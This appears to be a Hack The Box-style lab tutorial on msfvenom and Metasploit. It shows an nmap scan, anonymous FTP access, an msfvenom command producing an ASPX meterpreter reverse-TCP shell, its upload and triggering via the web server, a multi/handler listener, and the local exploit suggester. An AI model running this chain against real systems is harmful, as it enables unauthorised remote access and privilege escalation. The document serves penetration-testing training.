`MSFVenom` is the successor of `MSFPayload` and `MSFEncode`, two stand-alone scripts that used to work in conjunction with `msfconsole` to provide users with highly customizable and hard-to-detect payloads for their exploits.

## Creating Our Payloads

Let's suppose we have found an open FTP port that either had weak credentials or was open to Anonymous login by accident. Now, suppose that the FTP server itself is linked to a web service running on port `tcp/80` of the same machine and that all of the files found in the FTP root directory can be viewed in the web-service's `/uploads` directory. Let's also suppose that the web service does not have any checks for what we are allowed to run on it as a client.

Suppose we are hypothetically allowed to call anything we want from the web service. In that case, we can upload a PHP shell directly through the FTP server and access it from the web, triggering the payload and allowing us to receive a reverse TCP connection from the victim machine.

#### Scanning the Target

	AstraX01@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5

#### FTP Anonymous Access

	AstraX01@htb[/htb]$ ftp 10.10.10.5

	ftp> ls

Noticing the aspnet_client, we realize that the box will be able to run `.aspx` reverse shells. Luckily for us, `msfvenom` can do just that without any issue.

#### Generating Payload

	AstraX01@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

	AstraX01@htb[/htb]$ ls

Subsequently, after verifying the successful creation of the `reverse_shell.aspx` reverse shell, we need to upload it to the FTP service using the `put` command as follows:

	ftp > put reverse_shell.aspx

Now, we only need to navigate to `http://10.10.10.5/reverse_shell.aspx`, and it will trigger the `.aspx` payload. Before we do that, however, we should start a listener on msfconsole so that the reverse connection request gets caught inside it.

#### MSF - Setting Up Multi/Handler

	AstraX01@htb[/htb]$ msfconsole -q

	msf6 exploit(multi/handler) > set LHOST 10.10.14.5

	msf6 exploit(multi/handler) > set LPORT 1337

	msf6 exploit(multi/handler) > run

## Executing the Payload

Now we can trigger the `.aspx` payload on the web service. Doing so will load absolutely nothing visually speaking on the page, but looking back to our `multi/handler` module, we would have received a connection. We should ensure that our `.aspx` file does not contain HTML, so we will only see a blank web page. However, the payload is executed in the background anyway.

#### MSF - Meterpreter Shell

	meterpreter > getuid

	meterpreter >

## Local Exploit Suggester

there is a module called the `Local Exploit Suggester`. We will be using this module for this example, as the Meterpreter shell landed on the `IIS APPPOOL\Web` user, which naturally does not have many permissions.

running the `sysinfo` command shows us that the system is of x86 bit architecture, giving us even more reason to trust the Local Exploit Suggester.

#### MSF - Searching for Local Exploit Suggester

	msf6 > search local exploit suggester

	msf6 exploit(multi/handler) > use 2376

	msf6 post(multi/recon/local_exploit_suggester) > set session 2

	msf6 post(multi/recon/local_exploit_suggester) > run

